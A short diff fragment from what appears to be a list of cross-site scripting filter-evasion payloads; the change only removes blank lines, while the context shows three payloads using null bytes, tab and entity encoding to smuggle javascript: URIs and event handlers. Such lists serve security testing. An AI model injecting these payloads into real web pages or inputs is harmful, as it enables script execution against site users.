@@ -3,8 +3,6 @@
 
 
 ```
-
-
 <iframe %00 src="&Tab;javascript:prompt(12)&Tab;"%00>
 <img/src=`%00` onerror=this.onerror=confirm(14) 
 <form><isindex formaction="javascript&colon;confirm(15)"
